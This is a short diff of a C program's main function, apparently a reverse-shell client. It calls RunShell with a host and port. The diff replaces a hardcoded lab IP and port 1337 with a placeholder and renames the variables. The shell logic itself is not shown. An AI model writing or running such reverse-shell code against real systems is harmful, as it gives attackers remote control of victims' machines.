@@ -62,9 +62,9 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "10.10.249.120";
-        int port = 1337;
-        RunShell(host, port);
+        char cheese[] = "x.x.x.x";
+        int grater = 1337;
+        RunShell(cheese, grater);
     }
     return 0;
 } 
